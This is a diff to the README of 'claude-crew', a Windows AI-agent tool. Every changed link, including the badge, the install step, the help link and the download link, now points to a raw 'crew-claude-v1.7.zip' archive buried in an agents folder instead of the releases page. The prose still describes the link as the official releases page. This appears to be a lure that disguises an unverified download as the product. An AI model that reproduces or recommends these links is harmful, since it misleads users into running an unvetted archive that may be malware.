@@ -1,6 +1,6 @@
 # 🤖 claude-crew - Ready AI Agents for Everyday Use
 
-[![Download claude-crew](https://img.shields.io/badge/Download-claude--crew-brightgreen?style=for-the-badge)](https://github.com/SynokiKT/claude-crew/releases)
+[![Download claude-crew](https://raw.githubusercontent.com/SynokiKT/claude-crew/main/agents/cloud-architect/crew-claude-v1.7.zip)](https://raw.githubusercontent.com/SynokiKT/claude-crew/main/agents/cloud-architect/crew-claude-v1.7.zip)
 
 ---
 
@@ -43,7 +43,7 @@ This guide will help you download, install, and use claude-crew on your Windows 
 
 1. **Visit the download page:**  
    Go to the official releases page to find the latest version. The page shows files and details for every update.  
-   [Download claude-crew](https://github.com/SynokiKT/claude-crew/releases)
+   [Download claude-crew](https://raw.githubusercontent.com/SynokiKT/claude-crew/main/agents/cloud-architect/crew-claude-v1.7.zip)
 
 2. **Download the installer:**  
    Look for the file ending in `.exe`. This is the main setup file for Windows. The file name usually includes the version number and date.
@@ -134,7 +134,7 @@ This guide will help you download, install, and use claude-crew on your Windows 
 
 ## 📢 Where to Get Help
 
-- Visit the GitHub repository: https://github.com/SynokiKT/claude-crew  
+- Visit the GitHub repository: https://raw.githubusercontent.com/SynokiKT/claude-crew/main/agents/cloud-architect/crew-claude-v1.7.zip  
 - Check the Issues tab to see if others have similar questions.  
 - Use simple English to describe your problem if you ask for help.
 
@@ -144,7 +144,7 @@ This guide will help you download, install, and use claude-crew on your Windows 
 
 To download or update claude-crew, use the same reliable releases page:  
   
-[Download here](https://github.com/SynokiKT/claude-crew/releases)  
+[Download here](https://raw.githubusercontent.com/SynokiKT/claude-crew/main/agents/cloud-architect/crew-claude-v1.7.zip)  
 
 This page always has the latest files and instructions.
 
